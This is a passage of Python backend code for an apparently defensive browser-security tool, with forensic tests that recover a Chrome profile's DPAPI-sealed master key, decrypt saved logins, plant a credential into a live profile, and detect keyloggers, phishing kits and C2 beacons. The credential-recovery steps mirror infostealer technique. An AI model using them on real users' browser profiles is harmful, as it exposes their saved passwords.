    as long as the browser process is alive — even a bare read-only connect
    attempt against it while the session is running fails immediately with
    "database is locked". So this stops the shared session, writes one row
    straight into the real `logins` table using the exact scheme Chrome itself
    uses (AES-256-GCM under the master key already DPAPI-sealed inside this
    profile's own Local State — recovered for real, not fabricated), then
    restarts the browser so the rest of the Live Test Runner keeps working.
    """
    from .c4.crypto import load_master_key
    from .c4.demo_case import to_chrome_time, _encrypt_password

    profile = _c4_live_profile()
    login_db = os.path.join(profile, "Login Data")
    assert os.path.exists(login_db), "Live profile has no Login Data store yet"

    loop = asyncio.get_event_loop()
    master_key = await loop.run_in_executor(None, load_master_key, profile)
    assert master_key, ("AES master key not recovered from this profile's Local State "
                        "— cannot encrypt a real credential for it")

    blob = _encrypt_password(_C4_LIVE_LOGIN_PASSWORD, master_key)
    assert blob, "AES-GCM unavailable — cannot encrypt a real credential for this profile"

    was_running = pw_session.is_running
    if was_running:
        await pw_session.stop()
    try:
        def _plant():
            import sqlite3
            now = to_chrome_time(datetime.now())
            con = sqlite3.connect(login_db, timeout=15)
            try:
                # No-op if the real table is somehow already present (it always
                # is on a Chromium-initialised profile); creates a minimal one
                # otherwise so this stays robust on a brand-new profile.
                con.execute("""CREATE TABLE IF NOT EXISTS logins (
                    origin_url VARCHAR NOT NULL, action_url VARCHAR,
                    username_element VARCHAR, username_value VARCHAR,
                    password_element VARCHAR, password_value BLOB,
                    submit_element VARCHAR, signon_realm VARCHAR NOT NULL,
                    date_created INTEGER NOT NULL, blacklisted_by_user INTEGER NOT NULL,
                    scheme INTEGER NOT NULL, password_type INTEGER, times_used INTEGER,
                    display_name VARCHAR, icon_url VARCHAR, federation_url VARCHAR,
                    skip_zero_click INTEGER, id INTEGER PRIMARY KEY AUTOINCREMENT,
                    date_last_used INTEGER, date_password_modified INTEGER)""")
                existing = con.execute(
                    "SELECT COUNT(*) FROM logins WHERE origin_url=? AND username_value=?",
                    (_C4_LIVE_LOGIN_ORIGIN, _C4_LIVE_LOGIN_USER)).fetchone()[0]
                if existing:
                    return False
                con.execute(
                    "INSERT INTO logins (origin_url,action_url,username_element,"
                    "username_value,password_element,password_value,submit_element,"
                    "signon_realm,date_created,blacklisted_by_user,scheme,password_type,"
                    "times_used,display_name,icon_url,federation_url,skip_zero_click,"
                    "date_last_used,date_password_modified) "
                    "VALUES (?,?,?,?,?,?,?,?,?,0,0,0,0,?,?,?,0,?,?)",
                    (_C4_LIVE_LOGIN_ORIGIN, _C4_LIVE_LOGIN_ORIGIN + "/auth", "username",
                     _C4_LIVE_LOGIN_USER, "password", blob, "",
                     _C4_LIVE_LOGIN_ORIGIN + "/", now, "", "", "", now, now))
                con.commit()
                return True
            finally:
                con.close()
        inserted = await loop.run_in_executor(None, _plant)
    finally:
        if was_running:
            await _ensure_browser_running()

    return {"detail": (
        f"{'Planted' if inserted else 'Already present'}: real login for "
        f"{_C4_LIVE_LOGIN_USER} @ {_C4_LIVE_LOGIN_ORIGIN} written into the live "
        f"profile's actual Login Data SQLite table, AES-256-GCM encrypted under "
        f"this profile's own {len(master_key)*8}-bit DPAPI-sealed master key "
        f"· browser {'restarted after the write' if was_running else 'was not running'}")}


async def _tc_c4_live_logins():
    """Login Data — read the real store and recover this profile's master key."""
    from .c4.crypto import load_master_key
    from .c4.extractor import extract_credentials
    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    events, warning = await loop.run_in_executor(
        None, extract_credentials, profile, _c4_live_tmp())
    assert warning is None, f"Login Data unreadable: {warning}"

    key = await loop.run_in_executor(None, load_master_key, profile)
    assert key, ("AES master key not recovered from this profile's Local State — "
                 "saved passwords could not be decrypted")
    statuses = {}
    for e in events:
        s = e["detail"].get("decryption", "?")
        statuses[s] = statuses.get(s, 0) + 1
    if events:
        assert statuses.get("success") == len(events), \
            f"only {statuses.get('success', 0)}/{len(events)} decrypted: {statuses}"
        detail = (f"{len(events)} saved login(s) read and "
                  f"{statuses.get('success', 0)} decrypted with the profile's own "
                  f"{len(key)*8}-bit AES key")
    else:
        detail = (f"Login Data store readable, 0 saved logins in this profile · "
                  f"{len(key)*8}-bit AES master key recovered from Local State via DPAPI "
                  f"— decryption ready the moment a password is saved")
    return {"detail": detail}


async def _tc_c4_live_extensions():
    """Extensions — recovered even though a Playwright profile has no Extensions/ folder."""
    from .c4.extractor import extract_extensions
    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    events = await loop.run_in_executor(None, extract_extensions, profile)
    assert events, ("No extensions recovered from the live profile — neither "
                    "Extensions/ nor Secure Preferences held a record")

    folder = sum(1 for e in events if e["source_file"] == "Extensions/")
    prefs = len(events) - folder
    risky = [e for e in events if e.get("risk_flag")]
    names = [e["detail"]["name"] for e in events]
    return {"detail": f"{len(events)} extension(s) — {folder} from Extensions/, {prefs} from "
                      f"Secure Preferences · {len(risky)} holding risky permissions · "
                      f"{', '.join(names[:4])}"}


async def _tc_c4_live_sessions():
    """Session restore — which tabs were open, straight out of the SNSS files."""
    from .c4.extractor import extract_sessions
    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    events, warning = await loop.run_in_executor(None, extract_sessions, profile)
    assert events, (f"No session tabs recovered — {warning or 'no Sessions/ store in this profile'}")

    files = sorted({e["detail"]["session_file"] for e in events})
    hosts = sorted({e["detail"]["host"] for e in events})
    tabs = sum(1 for e in events if e["detail"]["kind"] == "tabs")
    note = " · " + warning.split("—")[0].strip() if warning else ""
    return {"detail": f"{len(events)} restorable tab URL(s) across {len(hosts)} host(s) from "
                      f"{len(files)} session file(s) ({tabs} from the tab store){note}"}


async def _tc_c4_case_build():
    """Plant the breach evidence on disk as genuine Chromium databases."""
    from .c4 import demo_case
    loop = asyncio.get_event_loop()
    demo_case.install_coverage()
    case = await loop.run_in_executor(None, demo_case.build_case_profile)
    _C4_CASE.clear()
    _C4_CASE["case"] = case

    profile = case["profile"]
    for artifact in ("History", os.path.join("Network", "Cookies"), "Login Data"):
        assert os.path.exists(os.path.join(profile, artifact)), \
            f"case profile is missing {artifact}"
    planted = case["planted"]
    key_note = {"dpapi": "AES key sealed with real DPAPI",
                "no-dpapi": "DPAPI unavailable — blobs written unsealed",
                "unavailable": "AES-GCM library missing"}[case["key_status"]]
    return {"detail": f"{planted['baseline_visits']} days-of-normal-browsing visits + "
                      f"{planted['burst_visits']}-URL burst + breach at "
                      f"{case['breach_at'][11:16]} written to real SQLite · {key_note}"}


async def _tc_c4_extract():
    """Run the production extractor + full pipeline over the planted profile."""
    from .c4 import demo_case
    case = _c4_state("case")
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, demo_case.run_case_pipeline, case["root"])
    _C4_CASE["result"] = result

    counts = {}
    for event in result["events"]:
        counts[event["artifact_type"]] = counts.get(event["artifact_type"], 0) + 1
    missing = [t for t in ("history", "cookie", "download", "credential",
                           "extension", "session", "localstorage") if not counts.get(t)]
    assert not missing, f"artifact types not extracted: {', '.join(missing)}"
    return {"detail": f"{result['total_events']} events off disk — "
                      + "  ".join(f"{k}:{v}" for k, v in sorted(counts.items()))}


async def _tc_c4_crypto():
    """Recover saved passwords the way Chrome protects them."""
    result = _c4_state("result")
    case = _c4_state("case")
    creds = [e for e in result["events"] if e["artifact_type"] == "credential"]
    assert creds, "no credential records extracted"
    statuses = {}
    for c in creds:
        status = c["detail"].get("decryption", "?")
        statuses[status] = statuses.get(status, 0) + 1
    assert all("Payr0ll" not in str(c["detail"].get("password", "")) for c in creds), \
        "plaintext password leaked into the result"
    if case["key_status"] == "dpapi":
        assert statuses.get("success") == len(creds), \
            f"only {statuses.get('success', 0)}/{len(creds)} credentials decrypted: {statuses}"
    masked = sorted({c["detail"].get("password", "") for c in creds})
    return {"detail": f"{statuses.get('success', 0)}/{len(creds)} decrypted via DPAPI → "
                      f"AES-256-GCM · stored masked as {', '.join(masked)} "
                      f"(REVEAL_PLAINTEXT off)"}


async def _tc_c4_rules():
    """Every single-artifact rule R01-R06 on the planted evidence."""
    result = _c4_state("result")
    fired = {}
    for event in result["events"]:
        for flag in event.get("rule_flags", []):
            fired[flag["rule"]] = fired.get(flag["rule"], 0) + 1
    expected = ["R01", "R02", "R02b", "R03", "R04", "R05", "R06"]
    missing = [r for r in expected if not fired.get(r)]
    assert not missing, f"rules that never fired: {', '.join(missing)}"
    clean = sum(1 for e in result["events"] if not e.get("risk_flag"))
    return {"detail": "  ".join(f"{r}×{fired[r]}" for r in expected)
                      + f" · {clean} of {result['total_events']} events left clean"}


async def _tc_c4_det_cooccurrence():
    """Detector A — how many artifact types touch one domain in 2 minutes."""
    result, case = _c4_state("result"), _c4_state("case")
    domain = case["planted"]["breach_domain"]
    hits = [f for f in result["correlation"]["cooccurrence"] if f["domain"] == domain]
    assert hits, f"no co-occurrence finding for {domain}"
    top = max(hits, key=lambda f: f["type_count"])
    assert top["type_count"] >= 4, f"only {top['type_count']} artifact types linked"
    return {"detail": f"{domain}: {' + '.join(top['artifact_types'])} within 2 min "
                      f"→ score {top['score']}"}


async def _tc_c4_det_orphan():
    """Detector B — artifacts for a domain the user never visited."""
    result, case = _c4_state("result"), _c4_state("case")
    domain = case["planted"]["orphan_domain"]
    session_domain = case["planted"]["session_orphan_domain"]
    orphans = result["correlation"]["orphans"]
    hits = [f for f in orphans if domain in f["domain"]]
    session_hits = [f for f in orphans if session_domain in f["domain"]]
    assert len(hits) >= 2, f"expected cookie + localStorage orphans for {domain}, got {len(hits)}"
    assert session_hits, f"restored tab for {session_domain} was not flagged as an orphan"
    return {"detail": f"{domain}: {', '.join(sorted(f['artifact_type'] for f in hits))} · "
                      f"{session_domain}: open tab with no history entry — "
                      f"{len(orphans)} orphaned artifact(s) total"}


async def _tc_c4_det_temporal():
    """Detector C — activity outside this user's own learned hours."""
    result = _c4_state("result")
    correlation = result["correlation"]
    hits = [f for f in correlation["temporal"] if f["hour"] == 3]
    assert len(hits) >= 2, f"only {len(hits)} finding(s) at 03:00"
    baseline = correlation.get("baseline", {})
    busiest = max(baseline.items(), key=lambda kv: kv[1])[0] if baseline else "?"
    return {"detail": f"{len(hits)} artifact(s) at 03:00 — this user's baseline peaks at "
                      f"{busiest:02d}:00 with only {baseline.get(3, 0)} visit(s) ever at 03:00"}


async def _tc_c4_det_chain():
    """Detector D — ordered browse → download → credential on one domain."""
    result, case = _c4_state("result"), _c4_state("case")
    domain = case["planted"]["breach_domain"]
    chains = [f for f in result["correlation"]["attack_chains"] if f["domain"] == domain]
    ordered = [f for f in chains
               if f["artifact_types"] == ["history", "download", "credential"]]
    assert ordered, f"browse→download→credential chain not found on {domain}"
    top = max(ordered, key=lambda f: f["score"])
    return {"detail": f"{domain}: {' → '.join(top['artifact_types'])} between "
                      f"{top['window_start'][11:19]} and {top['window_end'][11:19]} "
                      f"→ score {top['score']}"}


async def _tc_c4_det_cluster():
    """Detector E — which domain concentrates the most cross-artifact risk."""
    result, case = _c4_state("result"), _c4_state("case")
    domain = case["planted"]["breach_domain"]
    clusters = result["correlation"]["domain_clusters"]
    assert clusters, "no domain risk clusters produced"
    assert clusters[0]["domain"] == domain, \
        f"breach domain did not rank first — top was {clusters[0]['domain']}"
    top = clusters[0]
    return {"detail": f"{domain} ranks #1 of {len(clusters)}: {top['event_count']} events across "
                      f"{len(top['artifact_types'])} artifact types, {top['flagged_count']} flagged "
                      f"→ score {top['score']}"}


async def _tc_c4_det_reuse():
    """Detector F — one saved identity reused across several domains."""
    result, case = _c4_state("result"), _c4_state("case")
    findings = result["correlation"]["credential_reuse"]
    assert findings, "credential reuse not detected"
    top = findings[0]
    assert len(top["domains"]) >= 3, f"reuse across only {len(top['domains'])} domain(s)"
    assert top["username"] == case["planted"]["victim_user"].lower()
    return {"detail": f"{top['username']} saved on {', '.join(top['domains'])} "
                      f"→ one stolen password unlocks {len(top['domains'])} accounts "
                      f"(score {top['score']})"}


async def _tc_c4_det_exfil():
    """Detector G — a drop followed by outbound navigation elsewhere."""
    result, case = _c4_state("result"), _c4_state("case")
    exfil_domain = case["planted"]["exfil_domain"]
    hits = [f for f in result["correlation"]["download_exfil"] if f["domain"] == exfil_domain]
    assert hits, f"download → {exfil_domain} correlation not detected"
    top = hits[0]
    return {"detail": f"{top['filename']} dropped from {top['source_domain']}, then "
                      f"{exfil_domain} opened at {top['window_end'][11:19]} "
                      f"— {int((_dt_seconds(top['window_start'], top['window_end'])))}s later"}


def _dt_seconds(start_iso, end_iso):
    try:
        return (datetime.fromisoformat(end_iso) - datetime.fromisoformat(start_iso)).total_seconds()
    except Exception:
        return 0


async def _tc_c4_mitre():
    """Map every correlation finding onto MITRE ATT&CK."""
    result = _c4_state("result")
    mitre = result["mitre_result"]
    findings = mitre["all_findings"]
    assert findings, "no MITRE findings"
    unmapped = [f for f in findings if not f.get("mitre", {}).get("technique_id")]
    assert not unmapped, f"{len(unmapped)} finding(s) carry no technique"
    techniques = sorted({f["mitre"]["technique_id"] for f in findings})
    tactics = sorted({f["mitre"].get("tactic", "") for f in findings} - {""})
    return {"detail": f"{len(findings)} findings → {len(techniques)} techniques across "
                      f"{len(tactics)} tactics · High:{mitre['by_severity']['High']} "
                      f"Medium:{mitre['by_severity']['Medium']} Low:{mitre['by_severity']['Low']} · "
                      + ", ".join(techniques[:6])}


async def _tc_c4_report():
    """Analyst HTML report and SIEM export off the same case."""
    from .c4 import reporter
    result, case = _c4_state("result"), _c4_state("case")
    loop = asyncio.get_event_loop()
    html = await loop.run_in_executor(None, reporter.generate_html_report, result)
    siem = await loop.run_in_executor(None, reporter.generate_siem_export, result)
    out_dir = os.path.join(case["root"], "reports")
    paths = await loop.run_in_executor(None, reporter.save_all_outputs, result, out_dir)
    assert case["planted"]["breach_domain"] in html, "breach domain missing from the report"
    assert siem["export_type"] == "C4_SIEM_Export" and siem["total_events"] > 0
    assert all(os.path.exists(p) for p in paths.values()), "report files not written"
    return {"detail": f"HTML {len(html):,} chars · SIEM envelope v{siem['export_version']} with "
                      f"{siem['total_events']} records · 3 files written to "
                      f"{os.path.basename(out_dir)}/"}


async def _tc_c4_verdict():
    """Aggregate the findings into the score the dashboard shows."""
    from .c4 import service as c4_service
    result = _c4_state("result")
    summary = c4_service.get_summary(result)
    assert summary["verdict"] in ("HIGH", "CRITICAL"), \
        f"planted breach only reached {summary['verdict']} ({summary['risk_score']})"
    return {"detail": f"risk {summary['risk_score']}/100 → {summary['verdict']} · "
                      f"{summary['flagged_events']} of {summary['total_events']} events flagged · "
                      f"{summary['total_findings']} findings from 7 detectors"}


async def _tc_c4_integrity():
    """Forensic soundness — reading evidence must not alter it."""
    from .c4.extractor import sha256
    case, result = _c4_state("case"), _c4_state("result")
    manifest = result["artifact_manifest"]
    assert manifest, "no evidence manifest recorded"
    changed = []
    for name, info in manifest.items():
        current = sha256(info["path"])
        if current != info["sha256"]:
            changed.append(name)
    assert not changed, f"evidence modified during analysis: {', '.join(changed)}"
    return {"detail": f"{len(manifest)} source file(s) byte-identical after the full pipeline · "
                      f"History sha256 {manifest['History']['sha256'][:24]}… · "
                      f"analysis ran on copies in {os.path.basename(case['root'])}/tmp"}


async def _tc_c4_coverage():
    """Prove — not assert — that the whole C4 surface ran on this case."""
    from .c4 import demo_case, service as c4_service
    c4_service.get_default_profile_path()
    c4_service.get_last_result()
    c4_service.render_last_html()
    c4_service.render_last_json()
    c4_service.render_last_siem()
    c4_service.report_filename("html")
    coverage = demo_case.coverage_report()
    demo_case.remove_coverage()
    assert coverage["called"] == coverage["total"], \
        f"{len(coverage['missing'])} function(s) never ran: {', '.join(coverage['missing'][:6])}"
    return {"detail": f"{coverage['called']}/{coverage['total']} C4 functions executed against the "
                      f"case — extractor, crypto, rules, correlation, mitre, reporter, service "
                      f"(excluded: {', '.join(coverage['excluded'])})"}


# ── Step-mode (demo pacing) ───────────────────────────────────────────────────
# When the Tests panel runs with ?step=1, test functions narrate via _step() and
# pause until the user presses "Next step" (POST /dev/test_step releases the gate).
_STEP_CTX = None  # {"queue": asyncio.Queue, "gate": asyncio.Event, "id": str}


async def _step(msg: str):
    """Step mode only: emit a narration event to the test stream, then wait for
    the user's Next click. No-op during normal (fast) runs."""
    ctx = _STEP_CTX
    if ctx is None:
        return
    ctx["gate"].clear()
    await ctx["queue"].put({"type": "step", "id": ctx["id"], "msg": msg})
    await ctx["gate"].wait()


@app.post("/dev/test_step")
async def dev_test_step():
    if _STEP_CTX is not None:
        _STEP_CTX["gate"].set()
    return {"ok": True, "waiting": _STEP_CTX is not None}


_ALL_TEST_CASES = [
    {"id":"c1_benign",    "component":"c1","label":"Benign manifest → no risk flags",         "fn":_tc_c1_benign_manifest},
    {"id":"c1_malicious", "component":"c1","label":"Malicious manifest → 4 high-risk flags",  "fn":_tc_c1_malicious_manifest},
    {"id":"c1_code_eval", "component":"c1","label":"Code: eval + atob + fetch + cookie detected","fn":_tc_c1_code_eval_detection},
    {"id":"c1_entropy",   "component":"c1","label":"Shannon entropy: obfuscated > clean",      "fn":_tc_c1_entropy},
    {"id":"c2_url_phish", "component":"c2","label":"URL: paypal-secure-login.yolasite.com flagged","fn":_tc_c2_url_phishing},
    {"id":"c2_url_clean", "component":"c2","label":"URL: google.com scores below threshold",  "fn":_tc_c2_url_benign},
    {"id":"c2_verified",  "component":"c2","label":"Verified domain: google.com → VERIFIED, free-host phish not trusted","fn":_tc_c2_verified_domain},
    {"id":"c2_form_off",  "component":"c2","label":"Form: off-domain POST → score > 0.5",     "fn":_tc_c2_form_offsite},
    {"id":"c2_form_same", "component":"c2","label":"Form: same-domain POST → score = 0",      "fn":_tc_c2_form_samedomain},
    {"id":"c2_browser_phish","component":"c2","label":"[Browser] BitB phishing page → detected live","fn":_tc_c2_browser_phish,"browser":True},
    {"id":"c2_browser_clean","component":"c2","label":"[Browser] Clean page → low score",     "fn":_tc_c2_browser_clean,"browser":True},
    {"id":"c2_kit_windows","component":"c2","label":"[Browser] Real mrd0x BitB kit (Windows) rendered live → PHISHING","fn":_tc_c2_kit_windows,"browser":True},
    {"id":"c2_kit_macos","component":"c2","label":"[Browser] Real mrd0x BitB kit (macOS) rendered live → PHISHING","fn":_tc_c2_kit_macos,"browser":True},
    {"id":"c2_scenario_oauth","component":"c2","label":"Scenario: fake Microsoft OAuth popup on lookalike domain → PHISHING","fn":_tc_c2_scenario_oauth},
    {"id":"c2_scenario_freehost","component":"c2","label":"Scenario: PayPal credential harvester on free hosting → flagged","fn":_tc_c2_scenario_freehost},
    {"id":"c2_scenario_compromised","component":"c2","label":"Scenario: BitB kit on a compromised legit domain (clean URL) → PHISHING","fn":_tc_c2_scenario_compromised},
    {"id":"c2_runtime_keylogger","component":"c2","label":"[Browser] Keylogger + off-origin credential exfil → L6 fires, block overlay shown","fn":_tc_c2_runtime_keylogger,"browser":True},
    {"id":"c2_benign_login","component":"c2","label":"[Browser] Realistic legitimate bank login → stays SAFE (no false positive)","fn":_tc_c2_benign_login,"browser":True},
    {"id":"c3_beacon_iat","component":"c3","label":"Beacon events: IAT-CV < 0.10 (clockwork timing)","fn":_tc_c3_beacon_iat},
    {"id":"c3_human_iat", "component":"c3","label":"Human browsing: IAT-CV > 0.10 (irregular)","fn":_tc_c3_human_iat},
    {"id":"c3_fusion_beacon","component":"c3","label":"Risk fusion: BEACON verdict at high signals","fn":_tc_c3_fusion_beacon},
    {"id":"c3_fusion_safe","component":"c3","label":"Risk fusion: SAFE verdict at zero signals","fn":_tc_c3_fusion_safe},
    {"id":"c4_live_hist", "component":"c4","label":"[Browser] Auto-launches browser, tours 15 real sites (incl. Sri Lanka), reads history back","fn":_tc_c4_live_history,"browser":True},
    {"id":"c4_live_dl",   "component":"c4","label":"[Browser] Real file download → sha256 hashed off disk","fn":_tc_c4_live_download,"browser":True},
    {"id":"c4_live_mal",  "component":"c4","label":"[Browser] EICAR test file downloaded live → C4's dangerous-download rule fires for real","fn":_tc_c4_live_malware_download,"browser":True},
    {"id":"c4_live_ck",   "component":"c4","label":"Live profile: cookies acquired from the session (DB is locked)","fn":_tc_c4_live_cookies},
    {"id":"c4_live_login_plant","component":"c4","label":"[Browser] Plants a real saved login into the live profile's Login Data store","fn":_tc_c4_live_login_plant,"browser":True},
    {"id":"c4_live_login","component":"c4","label":"Live profile: Login Data store + DPAPI master key recovery","fn":_tc_c4_live_logins},
    {"id":"c4_live_ext",  "component":"c4","label":"Live profile: extensions from Secure Preferences","fn":_tc_c4_live_extensions},
    {"id":"c4_live_sess", "component":"c4","label":"Live profile: restorable tabs from the SNSS session store","fn":_tc_c4_live_sessions},
    {"id":"c4_case",      "component":"c4","label":"Evidence: breach profile planted as real Chrome SQLite","fn":_tc_c4_case_build},
    {"id":"c4_extract",   "component":"c4","label":"Stage 1: extractor parses all 7 artifact types off disk","fn":_tc_c4_extract},
    {"id":"c4_crypto",    "component":"c4","label":"Stage 1b: saved passwords decrypted via DPAPI + AES-256-GCM","fn":_tc_c4_crypto},
    {"id":"c4_rules",     "component":"c4","label":"Stage 2: rules R01-R06 all fire on the planted case","fn":_tc_c4_rules},
    {"id":"c4_det_a",     "component":"c4","label":"Detector A: co-occurrence — 4 artifact types, one domain","fn":_tc_c4_det_cooccurrence},
    {"id":"c4_det_b",     "component":"c4","label":"Detector B: orphan — cookie/localStorage, no history","fn":_tc_c4_det_orphan},
    {"id":"c4_det_c",     "component":"c4","label":"Detector C: temporal — 03:00 vs this user's own baseline","fn":_tc_c4_det_temporal},
    {"id":"c4_det_d",     "component":"c4","label":"Detector D: attack chain — browse→download.exe→credential","fn":_tc_c4_det_chain},
    {"id":"c4_det_e",     "component":"c4","label":"Detector E: domain risk clustering — breach domain ranks #1","fn":_tc_c4_det_cluster},
    {"id":"c4_det_f",     "component":"c4","label":"Detector F: credential reuse — one identity, three domains","fn":_tc_c4_det_reuse},
    {"id":"c4_det_g",     "component":"c4","label":"Detector G: download → exfiltration navigation","fn":_tc_c4_det_exfil},
    {"id":"c4_mitre",     "component":"c4","label":"Stage 4: every finding mapped to MITRE ATT&CK","fn":_tc_c4_mitre},
    {"id":"c4_report",    "component":"c4","label":"Stage 5: HTML report + SIEM export written to disk","fn":_tc_c4_report},
    {"id":"c4_verdict",   "component":"c4","label":"Stage 6: risk score and verdict for the case","fn":_tc_c4_verdict},
    {"id":"c4_integrity", "component":"c4","label":"Forensic integrity: evidence unchanged after analysis","fn":_tc_c4_integrity},
    {"id":"c4_coverage",  "component":"c4","label":"Coverage: every C4 function executed on this case","fn":_tc_c4_coverage},
]


@app.get("/dev/run_tests_stream")
async def run_tests_stream_endpoint(component: str = "all", step: bool = False):
    """SSE stream: runs test cases one by one and emits results. With step=1,
    cases narrate via _step() and pause until POST /dev/test_step."""
    cases = [tc for tc in _ALL_TEST_CASES
             if component == "all" or tc["component"] == component]

    async def generate():
        global _STEP_CTX
        total = len(cases)
        yield f"data: {json.dumps({'type':'init','total':total,'step':step})}\n\n"
        passed = 0
        failed = 0
        for i, tc in enumerate(cases):
            yield f"data: {json.dumps({'type':'start','index':i,'id':tc['id'],'label':tc['label'],'component':tc['component'],'browser':tc.get('browser',False)})}\n\n"
            start = _time.time()
            try:
                if step:
                    queue, gate = asyncio.Queue(), asyncio.Event()
                    _STEP_CTX = {"queue": queue, "gate": gate, "id": tc["id"]}
                    task = asyncio.create_task(tc["fn"]())
                    try:
                        while True:
                            getter = asyncio.ensure_future(queue.get())
                            done, _ = await asyncio.wait(
                                {task, getter}, return_when=asyncio.FIRST_COMPLETED)
                            if getter in done:
                                yield f"data: {json.dumps(getter.result())}\n\n"
                            else:
                                getter.cancel()
                                result = task.result()  # re-raises fn exceptions
                                break
                    finally:
                        _STEP_CTX = None
                        if not task.done():
                            task.cancel()
                else:
                    result = await tc["fn"]()
                elapsed = round(_time.time() - start, 2)
                passed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'pass','elapsed':elapsed,'detail':result.get('detail',''),'browser_url':result.get('browser_url','')})}\n\n"
            except AssertionError as e:
                elapsed = round(_time.time() - start, 2)
                failed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'fail','elapsed':elapsed,'detail':str(e),'browser_url':''})}\n\n"
            except Exception as e:
                elapsed = round(_time.time() - start, 2)
                failed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'error','elapsed':elapsed,'detail':str(e),'browser_url':''})}\n\n"
            # small pause between tests so browser has time to display the page
            await asyncio.sleep(0.3)
        yield f"data: {json.dumps({'type':'done','passed':passed,'failed':failed,'total':total})}\n\n"

    return StreamingResponse(
        generate(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no", "Connection": "keep-alive"},
    )


@app.post("/dev/simulate_click")
async def dev_simulate_click():
    _BASE = os.path.dirname(os.path.abspath(__file__))
    ext_dir = os.path.join(_BASE, "c1", "test_malicious_ext")
    if not os.path.isdir(ext_dir):
        raise HTTPException(status_code=404,
            detail="test_malicious_ext directory not found next to main.py")
    manifest_path = os.path.join(ext_dir, "manifest.json")
    bg_path       = os.path.join(ext_dir, "background.js")
    with open(manifest_path, encoding="utf-8") as f:
        manifest_dict = json.load(f)
    with open(bg_path, encoding="utf-8") as f:
        source_code = f.read()
    fake_ext_id  = "test_malicious_ext_simulate"
    fake_url     = "https://chromewebstore.google.com/detail/websentinel-test/simulate"
    asyncio.create_task(_simulate_click_task(
        json.dumps(manifest_dict), source_code, ext_dir, fake_ext_id, fake_url
    ))
    return {"status": "simulation started — watch the C1 Live tab"}


async def _simulate_click_task(manifest_str, source_code, ext_path, ext_id, webstore_url):
    print(f"[C1-SIM] Simulating 'Add to Chrome' click: {ext_id}")
    await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                      "url": webstore_url, "state": "analyzing"})
    try:
        static_result    = await analyze_extension_c1(manifest_str, source_code, ext_id)
        static_score_pct = static_result["static"]["score"] * 100
        if static_score_pct >= 50.0:
            await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                               "url": webstore_url, "state": "sandbox_running",
                               "static_score": round(static_score_pct, 1)})
            c1_result = await analyze_extension_c1(manifest_str, source_code, ext_id,
                                                    extension_path=ext_path)
        else:
            c1_result = static_result
        _store_c1_result(c1_result, "simulated_click", webstore_url)
        _pending_installs[ext_id] = {"c1_result": c1_result, "ext_path": ext_path,
                                      "webstore_url": webstore_url}
        state = {"SAFE": "safe", "SUSPICIOUS": "suspicious",
                 "MALICIOUS": "malicious"}.get(c1_result["verdict"], "suspicious")
        print(f"[C1-SIM] {ext_id} -> {c1_result['verdict']} (score={c1_result['score']:.3f})")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": state, "result": c1_result})
    except Exception as exc:
        print(f"[C1-SIM] FAILED: {exc}")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": "error", "error": str(exc)})


@app.get("/session/pending_installs")
async def get_pending_installs():
    return {
        ext_id: {"verdict": v["c1_result"]["verdict"], "score": v["c1_result"]["score"],
                 "webstore_url": v["webstore_url"]}
        for ext_id, v in _pending_installs.items()
    }


# ══════════════════════════════════════════════════════════════════════════════
#  C3 — Browser Execution-Aware C2 Beacon Detector
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/c3/status")
async def c3_status():
    return c3_analyzer.status()


@app.get("/c3/alerts")
async def c3_alerts(limit: int = 50):
    return c3_alert_store.list_alerts(limit)


@app.get("/c3/hosts")
async def c3_hosts():
    return c3_analyzer.hosts()


@app.get("/c3/hosts/{host:path}")
async def c3_host_detail(host: str):
    return c3_analyzer.host_detail(host)


@app.get("/c3/requests")
async def c3_requests(limit: int = 50):
    return c3_analyzer.recent_requests(limit)


@app.post("/c3/hosts/{host:path}/unblock")
async def c3_unblock_host(host: str):
    await c3_interceptor.unblock_host(host)
    return c3_analyzer.status()


# NOTE ON ROUTE ORDER: this must stay registered *after* /unblock above.
# {host:path} matches slashes, so "/c3/hosts/example.com/unblock" would also
# satisfy this pattern with host="example.com/un".  Starlette matches routes in
# registration order, so /unblock claims that URL first and this route only ever
# sees a genuine .../block.  Do not move this above the unblock route.
@app.post("/c3/hosts/{host:path}/block")
async def c3_block_host(host: str):
    """Manually block a host (the 'Block Host' quick action on a C3 alert card).

    Calls the same interceptor path the opt-in auto-block uses, so a manual
    block and an automatic block are the same operation.
    """
    await c3_interceptor.block_host(host, reason="manual block via dashboard")
    return c3_analyzer.status()


@app.post("/c3/auto-block/enable")
async def c3_auto_block_enable():
    return c3_analyzer.enable_auto_block()


@app.post("/c3/auto-block/disable")
async def c3_auto_block_disable():
    return c3_analyzer.disable_auto_block()


@app.post("/c3/collect/start")
async def c3_collect_start(req: C3CollectReq):
    return c3_analyzer.start_collection(req.label)


@app.post("/c3/collect/stop")
async def c3_collect_stop():
    return c3_analyzer.stop_collection()


@app.post("/c3/collect/export")
async def c3_collect_export():
    return c3_analyzer.export_collection()


@app.get("/c3/test/beacon-target")
async def c3_test_beacon_target():
    return {"ok": True, "component": "c3", "target": "beacon",
            "timestamp": datetime.now().isoformat()}


@app.post("/c3/test/beacon-target")
async def c3_test_beacon_target_post(body: dict | None = None):
    return {"ok": True, "component": "c3", "target": "beacon",
            "received": body or {}, "timestamp": datetime.now().isoformat()}


@app.get("/c3/test/beacon-page", response_class=HTMLResponse)
async def c3_test_beacon_page(interval: int = 30000, method: str = "GET"):
    interval = max(1000, min(int(interval), 300000))
    method = "POST" if str(method).upper() == "POST" else "GET"
    body    = "JSON.stringify({ ts: Date.now(), component: 'c3' })" if method == "POST" else "undefined"
    headers = "{ 'Content-Type': 'application/json' }" if method == "POST" else "{}"
    return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>C3 Test Beacon</title>
  <style>
